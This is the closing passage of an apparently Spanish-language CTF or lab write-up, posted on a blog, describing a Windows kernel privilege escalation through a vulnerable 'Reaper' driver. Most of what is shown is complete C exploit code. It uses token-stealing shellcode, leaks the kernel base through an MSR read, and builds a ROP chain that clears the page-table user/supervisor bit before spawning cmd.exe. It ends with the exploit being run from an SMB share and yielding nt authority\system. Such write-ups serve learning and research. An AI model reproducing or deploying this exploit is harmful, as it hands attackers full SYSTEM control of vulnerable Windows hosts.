    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS  </span><span class="p">
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8d</span><span class="p">,</span><span class="mi"> 0x62</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                               // lea rsp, [rdx - 0x18]            ; clear stack</span><span class="p">
    </span><span class="mi">0xc3</span><span class="c1">                                                  // ret                              ; return</span><span class="p">
};

</span><span class="na">VOID ExecuteAddress</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> addr</span><span class="p">) {
    ReaperData userData;
    
    userData.Magic</span><span class="o"> =</span><span class="mi"> 0x6a55cc9e</span><span class="p">;
    userData.ThreadId</span><span class="o"> =</span><span class="p"> GetCurrentThreadId();
    userData.Priority </span><span class="o">=</span><span class="mi"> 0</span><span class="p">;
    userData.ExecAddress </span><span class="o">= </span><span class="p">addr;

    DeviceIoControl(hDevice, IOCTL_ALLOC, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData,</span><span class="o"> sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    DeviceIoControl(hDevice, IOCTL_EXEC, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData,</span><span class="o"> sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
}

</span><span class="na">QWORD ReadMSR</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> DWORD</span><span class="ra"> reg</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> output;
    ReaperData userData;

    userData.Magic</span><span class="o"> =</span><span class="mi"> 0x6a55cc9e</span><span class="p">;
    userData.ThreadId </span><span class="o">= </span><span class="p">GetCurrentThreadId();
    userData.Priority </span><span class="o">= </span><span class="mi">0</span><span class="p">;
    userData.SrcRegister </span><span class="o">= </span><span class="p">reg;
    userData.DstAddress </span><span class="o">= </span><span class="p">(</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">output;

    DeviceIoControl(hDevice, IOCTL_ALLOC, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData,</span><span class="o"> sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    DeviceIoControl(hDevice, IOCTL_READMSR, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData,</span><span class="o"> sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="o">return</span><span class="p"> output;
}

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">Reaper"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice</span><span class="o"> ==</span><span class="p"> INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">QWORD</span><span class="p"> KiSystemCall64</span><span class="o"> =</span><span class="p"> ReadMSR(hDevice, REGISTER_LSTAR);
    </span><span class="na">QWORD</span><span class="p"> kernelBase </span><span class="o">= </span><span class="p">KiSystemCall64 </span><span class="o">- </span><span class="p">OFFSET_KiSystemCall64;

    </span><span class="na">LPVOID</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="o"> sizeof</span><span class="p">(tokenStealing), MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(shellcode, tokenStealing, </span><span class="o">sizeof</span><span class="p">(tokenStealing));

    </span><span class="na">LPVOID</span><span class="p"> pivot</span><span class="o"> =</span><span class="p"> VirtualAlloc((</span><span class="na">LPVOID</span><span class="p">) (</span><span class="mi">0x48000000</span><span class="o"> -</span><span class="mi"> 0x1000</span><span class="p">), </span><span class="mi">0x10000</span><span class="p">, MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_READWRITE);
    VirtualLock(pivot,</span><span class="mi"> 0x10000</span><span class="p">);

    RtlFillMemory((</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> 0x48000000</span><span class="p">,</span><span class="mi"> 0x28</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);
    </span><span class="na">QWORD</span><span class="o"> *</span><span class="p">rop</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="o"> *</span><span class="p">)</span><span class="p"> ((</span><span class="na">QWORD</span><span class="p">) </span><span class="mi">0x48000000</span><span class="o"> +</span><span class="mi"> 0x28</span><span class="p">);

    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x2084f6</span><span class="p">;</span><span class="c1"> // pop rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">     // Token Stealing
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x31e2c4</span><span class="p">;</span><span class="c1"> // MiGetPteAddress
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x2084f6</span><span class="p">;</span><span class="c1"> // pop rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="mi"> 0x63</span><span class="p">;</span><span class="c1">                  // U/S bit off (2)
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x44b611</span><span class="p">;</span><span class="c1"> // mov [rax], cl; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x38b490</span><span class="p">;</span><span class="c1"> // wbinvd; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">     // Token Stealing</span><span class="p">

    ExecuteAddress(hDevice, kernelBase</span><span class="o"> +</span><span class="mi"> 0x3739b0</span><span class="p">);</span><span class="c1"> // mov esp, 0x48000000; add esp, 0x28; ret;
    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);

    CloseHandle(hDevice);
}</span>
</code></pre></div></div><br>

<p class="plain-text">Al estar en un proceso de baja integridad descargar el exploit compilado se vuelve complicado, lo que podemos hacer es cargarlo desde un recurso <code class="language-plaintext highlighter-rouge">smb</code>, al ejecutarlo nos convertimos en <code class="language-plaintext highlighter-rouge">nt authority\system</code> con el máximo nivel de integridad <code class="language-plaintext highlighter-rouge">system</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Windows\system32> </span><span class="am">\\10.8.0.100\user\exploit.exe  </span><span class="p">
Microsoft Windows [Version 10.0.20348.2402]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
nt authority\system

C:\Windows\system32></span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
